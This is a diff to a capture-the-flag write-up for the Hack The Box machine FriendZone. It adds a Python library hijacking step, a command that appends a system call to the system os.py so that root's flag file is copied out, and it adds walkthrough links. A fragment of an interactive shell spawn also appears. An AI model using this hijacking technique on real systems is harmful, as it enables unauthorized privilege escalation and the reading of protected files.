@@ -462,14 +462,26 @@ p=subprocess.call(["/bin/bash","-i"]);
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f1117a6-c15f-4b48-be4e-9782a51c2919)
 
 
+## Create A Bogus Python Library
++ Taking privilege of python library, let's create a bogus python library named as os.py to call root flag through this file.
+```
+cd /tmp
+echo "system ('cat /root/root.txt > /tmp/flag')" >> /usr/lib/python2.7/os.py
+```
+
+
+
 # References & Alternatives
 + https://vvmlist.github.io/#FriendZone
 + https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/friendzone-writeup-w-o-metasploit
 + https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/friendzoned
-+ 
++ https://ethicalhacs.com/friendzone-hackthebox-walkthrough/
++ https://0xrick.github.io/hack-the-box/friendzone/
++ https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
 
 
 # Technical Knowledge
 + [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/): https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
-+ 
++ https://ethicalhacs.com/admirer-hackthebox-walkthrough/
++ https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
